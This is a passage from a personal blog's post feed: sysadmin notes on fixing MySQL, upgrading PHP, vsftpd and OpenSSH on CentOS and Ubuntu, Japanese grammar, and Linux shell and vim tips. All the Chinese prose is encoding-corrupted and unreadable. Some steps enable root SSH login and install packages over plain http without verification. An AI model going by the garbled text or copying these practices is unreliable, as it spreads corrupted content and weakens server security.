5.7.11</span><br><span class="line">...</span><br><span class="line"> \* MySQL Community Server 5.7.11 is stopped</span><br><span class="line"> \* Re-starting MySQL Community Server 5.7.11</span><br><span class="line">No directory, logging <span class="keyword">in</span> with HOME=/</span><br><span class="line">..</span><br><span class="line"> \* MySQL Community Server 5.7.11 is started</span><br></pre></td></tr></table></figure><p>è§£å†³åŠæ³•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service MySQL stop</span><br><span class="line">sudo usermod -d /var/lib/mysql/ mysql</span><br><span class="line">sudo service mysql start</span><br></pre></td></tr></table></figure><ul><li>æ›´æ–°mysqlç‰ˆæœ¬åï¼Œæ‰€æœ‰çš„é…ç½®æ–‡ä»¶éƒ½ä¼šè¢«åˆ é™¤ï¼Œå› æ­¤éœ€è¦ä¿®æ”¹mysqlé…ç½®<br>è¯´äººè¯å°±æ˜¯ï¼Œè¿œç¨‹æ˜¯è®¿é—®ä¸åˆ°æœ¬æ•°æ®åº“çš„</li></ul><p>æŠŠ /etc/mysql/mysql.conf.d/mysql.cnf é…ç½®æ–‡ä»¶ä¸­<br>#bind-address =127.0.0.1 çš„æ³¨é‡Šç¬¦å·å»æ‰å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP upgrade, from 5.5.* to 7.2.*</title>
      <link href="2019/07/03/PHP_upgrade_from_5.5.*_to_7.2.24/"/>
      <url>2019/07/03/PHP_upgrade_from_5.5.*_to_7.2.24/</url>
      
        <content type="html"><![CDATA[<h3 id="æœåŠ¡å™¨ç‰ˆæœ¬-CentOS6"><a href="#æœåŠ¡å™¨ç‰ˆæœ¬-CentOS6" class="headerlink" title="æœåŠ¡å™¨ç‰ˆæœ¬ CentOS6"></a>æœåŠ¡å™¨ç‰ˆæœ¬ CentOS6</h3><h3 id="å¤‡ä»½-å¿«ç…§"><a href="#å¤‡ä»½-å¿«ç…§" class="headerlink" title="å¤‡ä»½(å¿«ç…§)"></a>å¤‡ä»½(å¿«ç…§)</h3><h3 id="é¦–å…ˆå¸è½½å½“å‰ç‰ˆæœ¬PHP"><a href="#é¦–å…ˆå¸è½½å½“å‰ç‰ˆæœ¬PHP" class="headerlink" title="é¦–å…ˆå¸è½½å½“å‰ç‰ˆæœ¬PHP"></a>é¦–å…ˆå¸è½½å½“å‰ç‰ˆæœ¬PHP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove php*</span><br></pre></td></tr></table></figure><h3 id="é…ç½®yumä»“åº“"><a href="#é…ç½®yumä»“åº“" class="headerlink" title="é…ç½®yumä»“åº“"></a>é…ç½®yumä»“åº“</h3><p>åœ¨CentOS6/7å‡çº§PHPè‡³7.* éœ€è¦å¼€å¯Remiå’ŒEPELä»“åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line"></span><br><span class="line">rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…PHP7-2"><a href="#å®‰è£…PHP7-2" class="headerlink" title="å®‰è£…PHP7.2"></a>å®‰è£…PHP7.2</h3><p>éœ€è¦åœ¨yumä¸­æŒ‡å®šéœ€è¦ä½¿ç”¨çš„ç›¸å…³ä»“åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=remi-php72 install php</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåæ£€æŸ¥ PHP ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -v</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…ç›¸å…³-PHP-æ¨¡å—"><a href="#å®‰è£…ç›¸å…³-PHP-æ¨¡å—" class="headerlink" title="å®‰è£…ç›¸å…³ PHP æ¨¡å—"></a>å®‰è£…ç›¸å…³ PHP æ¨¡å—</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=remi-php72 install php-xml php-soap php-xmlrpc php-mbstring php-json php-gd php-mcrypt php-fpm</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå°å‘,æˆ‘åœ¨å®‰è£…php-gdçš„æ—¶å€™ä¼šå¼¹å‡ºä¸€ä¸‹é”™è¯¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error: Package: gd-last-2.2.5-5.el6.remi.x86_64 (remi-safe)</span><br><span class="line">           Requires: libwebp.so.5()(64bit)</span><br><span class="line"> You could try using --skip-broken to work around the problem</span><br></pre></td></tr></table></figure><p>è°·æ­Œlibwebp.so.5()(64bit)è¿™ä¸ªä¾èµ–é¡¹åå‘ç°ä»¥ä¸‹ä¸¤ä¸ªé“¾æ¥</p><p><a href="https://pkgs.org/download/libwebp.so.5()(64bit)">https://pkgs.org/download/libwebp.so.5()(64bit)</a><br><a href="https://centos.pkgs.org/6/atomic-x86_64/libwebp-0.4.3-3.el6.art.x86_64.rpm.html">https://centos.pkgs.org/6/atomic-x86_64/libwebp-0.4.3-3.el6.art.x86_64.rpm.html</a></p><p>äºæ˜¯é¡ºåŠ¿æ‰¾åˆ°rpmåŒ…é“¾æ¥</p><p><a href="http://www6.atomicorp.com/channels/atomic/centos/6/x86_64/RPMS/libwebp-0.4.3-3.el6.art.x86_64.rpm">http://www6.atomicorp.com/channels/atomic/centos/6/x86_64/RPMS/libwebp-0.4.3-3.el6.art.x86_64.rpm</a></p><p>å®‰è£…å®ƒå°±å¥½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -i it</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±å¯ä»¥å¯åŠ¨php-fpmå¹¶è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨å•¦!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service php-fpm start</span><br><span class="line"></span><br><span class="line">chkconfig php-fpm on</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦,ä¹ŸæŠŠmysqlæœåŠ¡è£…ä¸Š,é¡ºä¾¿å¯ç”¨å®ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=remi-php72 install php-mysql</span><br><span class="line"></span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Œå½¢å®¹è©ã€</title>
      <link href="2019/07/02/%E3%80%8C%E5%BD%A2%E5%AE%B9%E8%A9%9E%E3%80%8D/"/>
      <url>2019/07/02/%E3%80%8C%E5%BD%A2%E5%AE%B9%E8%A9%9E%E3%80%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="ã€Œãªå½¢å®¹è©ã€"><a href="#ã€Œãªå½¢å®¹è©ã€" class="headerlink" title="ã€Œãªå½¢å®¹è©ã€"></a>ã€Œãªå½¢å®¹è©ã€</h3><ul><li><strong>ã€Œãªå½¢å®¹è©ã€+ ãªã€€+ åè¯ ï¼Œå› æ­¤ç§°ä¸ºã€Œãªå½¢å®¹è©ã€</strong><br>&nbsp; åè¯ + ã® + åè¯</li></ul><p>ã«ãã‚„ã‹ï¼šçƒ­é—¹çš„</p><h3 id="ã€Œã„å½¢å®¹è©ã€ç‰¹å¾´ï¼šã€œã„"><a href="#ã€Œã„å½¢å®¹è©ã€ç‰¹å¾´ï¼šã€œã„" class="headerlink" title="ã€Œã„å½¢å®¹è©ã€ç‰¹å¾´ï¼šã€œã„"></a>ã€Œã„å½¢å®¹è©ã€ç‰¹å¾´ï¼šã€œã„</h3><ul><li>ã„å½¢å®¹è© + åè¯<br>ä¾‹ï¼šå¤§ãã„ä¼šç¤¾</li></ul><table><thead><tr><th align="center">è‚¯å®šè¡Œ</th><th align="center">å¦å®šè¡Œ</th></tr></thead><tbody><tr><td align="center">ã€œã„ã¾ã™</td><td align="center">ã€œ **<del>ã„</del>**ããªã„ã§ã™</td></tr><tr><td align="center">å¯’ã„ã§ã™</td><td align="center">å¯’ããªã„ã§ã™</td></tr></tbody></table><p>è¾›ã„ã€€æš–ã‹ã„ã€€æš‘ã„ã€€ï¼ˆé£Ÿã¹ï¼‰ãŸã„ã§ã™</p>]]></content>
      
      
      <categories>
          
          <category> å‹‰å¼· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‹‰å¼· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsftpd upgrade, from 2.2.2 to 3.0.3</title>
      <link href="2019/07/01/vsftpd_upgrade_from_2.2.2_to_3.0.3/"/>
      <url>2019/07/01/vsftpd_upgrade_from_2.2.2_to_3.0.3/</url>
      
        <content type="html"><![CDATA[<h3 id="è®°ä¸€æ¬¡vsftpd-å‡çº§è¿‡ç¨‹"><a href="#è®°ä¸€æ¬¡vsftpd-å‡çº§è¿‡ç¨‹" class="headerlink" title="è®°ä¸€æ¬¡vsftpd å‡çº§è¿‡ç¨‹"></a>è®°ä¸€æ¬¡vsftpd å‡çº§è¿‡ç¨‹</h3><h3 id="å¤‡ä»½-å¿«ç…§"><a href="#å¤‡ä»½-å¿«ç…§" class="headerlink" title="å¤‡ä»½(å¿«ç…§)"></a>å¤‡ä»½(å¿«ç…§)</h3><h3 id="æ”¶é›†ç³»ç»Ÿä¿¡æ¯ä»¥åŠåŸæœ‰vsftpdå®‰è£…ç‰ˆæœ¬ä¿¡æ¯"><a href="#æ”¶é›†ç³»ç»Ÿä¿¡æ¯ä»¥åŠåŸæœ‰vsftpdå®‰è£…ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="æ”¶é›†ç³»ç»Ÿä¿¡æ¯ä»¥åŠåŸæœ‰vsftpdå®‰è£…ç‰ˆæœ¬ä¿¡æ¯"></a>æ”¶é›†ç³»ç»Ÿä¿¡æ¯ä»¥åŠåŸæœ‰vsftpdå®‰è£…ç‰ˆæœ¬ä¿¡æ¯</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">rpm -qa | grep vsftpd</span><br><span class="line">vsftpd -v</span><br></pre></td></tr></table></figure><h3 id="å¸è½½åŸ-vsftpd"><a href="#å¸è½½åŸ-vsftpd" class="headerlink" title="å¸è½½åŸ vsftpd"></a>å¸è½½åŸ vsftpd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -e vsftpd-******</span><br></pre></td></tr></table></figure><h3 id="GPGç­¾åè®¤è¯"><a href="#GPGç­¾åè®¤è¯" class="headerlink" title="GPGç­¾åè®¤è¯"></a>GPGç­¾åè®¤è¯</h3><p>ç”±äºæ²¡ç”¨åˆ°å…¬é’¥,å› æ­¤è·³è¿‡ä¸‹é¢ä¸¤æ¡å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg -import publickey</span><br><span class="line">gpg -verify ***.asc(.sig) ***</span><br></pre></td></tr></table></figure><h3 id="è§£å‹åè¿›è¡Œåº“æ–‡ä»¶ç›¸å…³è®¾ç½®"><a href="#è§£å‹åè¿›è¡Œåº“æ–‡ä»¶ç›¸å…³è®¾ç½®" class="headerlink" title="è§£å‹åè¿›è¡Œåº“æ–‡ä»¶ç›¸å…³è®¾ç½®"></a>è§£å‹åè¿›è¡Œåº“æ–‡ä»¶ç›¸å…³è®¾ç½®</h3><p>å®‰è£…ä¹‹å‰,å¦‚æœç³»ç»Ÿä¸º64ä½ï¼Œéœ€è¦æ›´æ”¹vsf_findlibs.shæ–‡ä»¶åº“ä¸­lib è·¯å¾„æ”¹ä¸ºlib64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/lib\//lib64\//g&#x27;</span> vsf_findlibs.sh</span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h3><p>ç”±äºæ²¡æœ‰ç›¸å…³ä¾èµ–,å› æ­¤ä¸ç”¨è¿›è¡Œé¢„ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="é…ç½®ä¿¡æ¯ä¿®æ”¹"><a href="#é…ç½®ä¿¡æ¯ä¿®æ”¹" class="headerlink" title="é…ç½®ä¿¡æ¯ä¿®æ”¹"></a>é…ç½®ä¿¡æ¯ä¿®æ”¹</h3><p>å› ä¸ºæ˜¯å‡çº§å®‰è£…ï¼Œéœ€è¦ä¿ç•™åŸæ¥vsftpçš„ç›¸å…³é…ç½®ï¼Œæ¥ä¸‹æ¥éœ€è¦å¤åˆ¶äº›æ–‡ä»¶åˆ°ç›¸åº”<br>vsftpç›®å½•ã€‚å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp vsftpd.conf /etc Â  Â  Â  Â  Â  Â Â       <span class="comment">#é…ç½®ä¸»æ–‡ä»¶ Â  Â Â </span></span><br><span class="line">cp RedHat/vsftpd.pam /etc/pam.d/ftp Â  <span class="comment">#PAM è®¤è¯æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç³»ç»Ÿä¸º64ä½ï¼Œè¯·å°†/etc/pam.d/ftp /libç›®å½•æ›¿æ¢ä¸º/lib64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/lib\//lib64\//g&#x27;</span> /etc/pam.d/ftp</span><br></pre></td></tr></table></figure><p>å°†ä»¥ä¸‹å†…å®¹å†™å…¥ /etc/vsftpd.conf</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">anonymous_enable=NO</span><br><span class="line">local_enable=yes</span><br><span class="line">write_enable=YES</span><br></pre></td></tr></table></figure><h3 id="å¯åŠ¨-vsftpd-è¿›è¡Œæµ‹è¯•"><a href="#å¯åŠ¨-vsftpd-è¿›è¡Œæµ‹è¯•" class="headerlink" title="å¯åŠ¨ vsftpd è¿›è¡Œæµ‹è¯•"></a>å¯åŠ¨ vsftpd è¿›è¡Œæµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd /etc/vsftpd.conf &amp;</span><br></pre></td></tr></table></figure><h3 id="æŠŠ-vsftpd-åŠ å…¥åˆ°å¼€æœºå¯åŠ¨é¡¹ä¸­"><a href="#æŠŠ-vsftpd-åŠ å…¥åˆ°å¼€æœºå¯åŠ¨é¡¹ä¸­" class="headerlink" title="æŠŠ vsftpd åŠ å…¥åˆ°å¼€æœºå¯åŠ¨é¡¹ä¸­"></a>æŠŠ vsftpd åŠ å…¥åˆ°å¼€æœºå¯åŠ¨é¡¹ä¸­</h3><p>å°†ä»¥ä¸‹å†…å®¹å†™å…¥ /etc/rc.d/rc.local_enable</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd /etc/vsftpd.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹é…ç½®æ–‡ä»¶å¦‚ä¸‹é€‰é¡¹ï¼Œå¦‚æœæ²¡æœ‰ç›¸å…³é€‰é¡¹å’Œç›®å½•éœ€æ‰‹åŠ¨æ·»åŠ æˆ–åˆ›å»º"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶å¦‚ä¸‹é€‰é¡¹ï¼Œå¦‚æœæ²¡æœ‰ç›¸å…³é€‰é¡¹å’Œç›®å½•éœ€æ‰‹åŠ¨æ·»åŠ æˆ–åˆ›å»º" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶å¦‚ä¸‹é€‰é¡¹ï¼Œå¦‚æœæ²¡æœ‰ç›¸å…³é€‰é¡¹å’Œç›®å½•éœ€æ‰‹åŠ¨æ·»åŠ æˆ–åˆ›å»º"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶å¦‚ä¸‹é€‰é¡¹ï¼Œå¦‚æœæ²¡æœ‰ç›¸å…³é€‰é¡¹å’Œç›®å½•éœ€æ‰‹åŠ¨æ·»åŠ æˆ–åˆ›å»º</h3><p>åˆ›å»º /usr/share/empty æ–‡ä»¶å¤¹å¹¶å°†ä»¥ä¸‹å†…å®¹å†™å…¥ /etc/vsftpd.conf</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_chroot_dir=/usr/share/<span class="built_in">empty</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå¦‚é‡å¯åä¸èƒ½å¯åŠ¨æœåŠ¡ä¿®æ”¹ /etc/xinetd.d/vsftpd æ–‡ä»¶ï¼ŒæŠŠ disable=no æ”¹æˆ disable=yes å°±è¡Œäº†</p><h3 id="ç‰ˆæœ¬éªŒè¯"><a href="#ç‰ˆæœ¬éªŒè¯" class="headerlink" title="ç‰ˆæœ¬éªŒè¯"></a>ç‰ˆæœ¬éªŒè¯</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd -v</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒè‡ª-https-blog-csdn-net-dbdeep-article-details-63037691"><a href="#å‚è€ƒè‡ª-https-blog-csdn-net-dbdeep-article-details-63037691" class="headerlink" title="å‚è€ƒè‡ª: https://blog.csdn.net/dbdeep/article/details/63037691"></a>å‚è€ƒè‡ª: <a href="https://blog.csdn.net/dbdeep/article/details/63037691">https://blog.csdn.net/dbdeep/article/details/63037691</a></h4>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
          <category> vsftpd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> vsftpd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openssh upgrade, from 7.5 to 8.0p1</title>
      <link href="2019/07/01/Openssh_upgrade_from_7.5_to_8.0p1/"/>
      <url>2019/07/01/Openssh_upgrade_from_7.5_to_8.0p1/</url>
      
        <content type="html"><![CDATA[<h3 id="è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹"><a href="#è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹" class="headerlink" title="è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹"></a>è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹</h3><h3 id="ç³»ç»Ÿç¯å¢ƒ-Ubuntu14-04"><a href="#ç³»ç»Ÿç¯å¢ƒ-Ubuntu14-04" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ: Ubuntu14.04"></a>ç³»ç»Ÿç¯å¢ƒ: Ubuntu14.04</h3><h3 id="sshd-D"><a href="#sshd-D" class="headerlink" title="sshd -D"></a>sshd -D</h3><p>å…ˆæ˜¯ä¿®æ”¹sshdé…ç½®å…è®¸rootç™»å½•ï¼Œä½†æ˜¯é‡å¯ä¸äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service ssh restart </span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å¾—çŸ¥å­˜åœ¨ sshd -D è¿›ç¨‹å¹¶ç»ˆæ­¢å®ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep ssh</span><br><span class="line">sudo <span class="built_in">kill</span> ID</span><br></pre></td></tr></table></figure><p>æœ€åå¼€å¯sshd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/sshd -D</span><br></pre></td></tr></table></figure><p>å¯åŠ¨åå°±å¯ä»¥rootç™»å½•äº†<br>emmmâ€¦. å¥½åƒå¯åŠ¨ååªèƒ½ç™»å½•ä¸€æ¬¡?<br>é‚£è¯·è¯•è¯•:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/sshd -t</span><br></pre></td></tr></table></figure><p>å¥½å¥‡çš„æˆ‘æƒ³çŸ¥é“-Dæ˜¯ä»€ä¹ˆæ„æ€â€¦<br>ä½†çœ‹äº†è¯´æ˜ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆç³»åˆ—ã€‚ã€‚<br>-D When this option is specified, sshd will not detach and does not become a daemon.  This allows easy monitoring of sshd.</p><p>ä¼šä¸ä¼šå’Œè¿™æœ‰å…³å‘¢? (æ‘˜è‡ªå®˜ç½‘)<br>OpenSSH runs as two processes when connecting to other computers. The first process is a privileged process and controls the issuance of privileges as necessary. The second process communicates with the network.</p><h3 id="å¿«ç…§"><a href="#å¿«ç…§" class="headerlink" title="å¿«ç…§"></a>å¿«ç…§</h3><p>åˆ«å¿˜äº†å¤‡ä»½ã€åˆ«å¿˜äº†å¤‡ä»½ã€åˆ«å¿˜äº†å¤‡ä»½â€¦</p><h3 id="å¸è½½åŸæœ¬OpenSSH"><a href="#å¸è½½åŸæœ¬OpenSSH" class="headerlink" title="å¸è½½åŸæœ¬OpenSSH"></a>å¸è½½åŸæœ¬OpenSSH</h3><p>ç”±äºæˆ‘åŸæœ¬æ˜¯ç¼–è¯‘å®‰è£…çš„ï¼Œåˆ°åŸæœ¬ç¼–è¯‘å®‰è£…çš„ç›®å½•å¸è½½å°±å¯ä»¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make uninstall</span><br></pre></td></tr></table></figure><h3 id="ä¸‹è½½OpenSSH"><a href="#ä¸‹è½½OpenSSH" class="headerlink" title="ä¸‹è½½OpenSSH"></a>ä¸‹è½½OpenSSH</h3><p>åˆ°å®˜ç½‘ä¸‹è½½å°±å¯ä»¥äº†<br><a href="http://www.openssh.com/releasenotes.html">http://www.openssh.com/releasenotes.html</a></p><h3 id="SHA1å€¼æ£€éªŒ"><a href="#SHA1å€¼æ£€éªŒ" class="headerlink" title="SHA1å€¼æ£€éªŒ"></a>SHA1å€¼æ£€éªŒ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1sum openssh-8.0p1.tar.gz</span><br></pre></td></tr></table></figure><h3 id="ç›¸å…³ä¾èµ–åŒ…"><a href="#ç›¸å…³ä¾èµ–åŒ…" class="headerlink" title="ç›¸å…³ä¾èµ–åŒ…"></a>ç›¸å…³ä¾èµ–åŒ…</h3><p>pam pam-devel zlib zlib-devel openssl-devel</p><h5 id="æ³¨æ„ä¸‹ubuntuä¸‹pamæ˜¯-libpam0gã€pam-devel-æ˜¯-libpam0g-dev"><a href="#æ³¨æ„ä¸‹ubuntuä¸‹pamæ˜¯-libpam0gã€pam-devel-æ˜¯-libpam0g-dev" class="headerlink" title="æ³¨æ„ä¸‹ubuntuä¸‹pamæ˜¯ libpam0gã€pam-devel æ˜¯ libpam0g-dev"></a>æ³¨æ„ä¸‹ubuntuä¸‹pamæ˜¯ libpam0gã€pam-devel æ˜¯ libpam0g-dev</h5><h3 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-md5-passwords --with-pam --with-zlib --with-ssl-dir=/usr/<span class="built_in">local</span>/ssl --with-privsep-path=/var/lib/sshd</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="é‡å¯æœåŠ¡å™¨ï¼Œæå®šï¼"><a href="#é‡å¯æœåŠ¡å™¨ï¼Œæå®šï¼" class="headerlink" title="é‡å¯æœåŠ¡å™¨ï¼Œæå®šï¼"></a>é‡å¯æœåŠ¡å™¨ï¼Œæå®šï¼</h3>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>memo</title>
      <link href="2019/06/30/memo/"/>
      <url>2019/06/30/memo/</url>
      
        <content type="html"><![CDATA[<h3 id="è®°å½•-linux-ä¸€äº›å¸¸è§é—®é¢˜"><a href="#è®°å½•-linux-ä¸€äº›å¸¸è§é—®é¢˜" class="headerlink" title="è®°å½• linux ä¸€äº›å¸¸è§é—®é¢˜"></a>è®°å½• linux ä¸€äº›å¸¸è§é—®é¢˜</h3><h4 id="ä¸€ã€æŸç«¯å£æ˜¯å¦è¢«-Linux-é˜²ç«å¢™é˜»æ­¢"><a href="#ä¸€ã€æŸç«¯å£æ˜¯å¦è¢«-Linux-é˜²ç«å¢™é˜»æ­¢" class="headerlink" title="ä¸€ã€æŸç«¯å£æ˜¯å¦è¢« Linux é˜²ç«å¢™é˜»æ­¢"></a>ä¸€ã€æŸç«¯å£æ˜¯å¦è¢« Linux é˜²ç«å¢™é˜»æ­¢</h4><p>-L: æŸ¥çœ‹ç®¡ç†å‘½ä»¤<br>å­å‘½ä»¤:<br>&emsp;-nï¼šä»¥æ•°å­—çš„æ–¹å¼æ˜¾ç¤ºipï¼Œå®ƒä¼šå°†ipç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦‚æœä¸åŠ -nï¼Œåˆ™ä¼šå°†ipåå‘è§£ææˆä¸»æœºåã€‚<br>&emsp;-vï¼šæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -vnL | grep <span class="string">&#x27;:port&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="äºŒã€-å­—ç¬¦å¯¹ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ–‡æœ¬æ›¿æ¢å¹¶é‡æ–°æ‰§è¡Œå‘½ä»¤"><a href="#äºŒã€-å­—ç¬¦å¯¹ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ–‡æœ¬æ›¿æ¢å¹¶é‡æ–°æ‰§è¡Œå‘½ä»¤" class="headerlink" title="äºŒã€^å­—ç¬¦å¯¹ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ–‡æœ¬æ›¿æ¢å¹¶é‡æ–°æ‰§è¡Œå‘½ä»¤"></a>äºŒã€^å­—ç¬¦å¯¹ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ–‡æœ¬æ›¿æ¢å¹¶é‡æ–°æ‰§è¡Œå‘½ä»¤</h4><p>^before^after^</p><h4 id="ä¸‰ã€vimç³»åˆ—"><a href="#ä¸‰ã€vimç³»åˆ—" class="headerlink" title="ä¸‰ã€vimç³»åˆ—"></a>ä¸‰ã€vimç³»åˆ—</h4><ul><li><p>vim å­—ç¬¦ä¸²æ›¿æ¢</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">:s/well/good/æ›¿æ¢å½“å‰è¡Œç¬¬ä¸€ä¸ªwellÂ ä¸ºÂ good</span><br><span class="line"></span><br><span class="line">:s/well/good/gÂ Â Â Â Â Â Â Â æ›¿æ¢å½“å‰è¡Œæ‰€æœ‰wellÂ ä¸ºÂ good</span><br><span class="line"></span><br><span class="line">:n,$s/well/good/Â Â Â Â Â 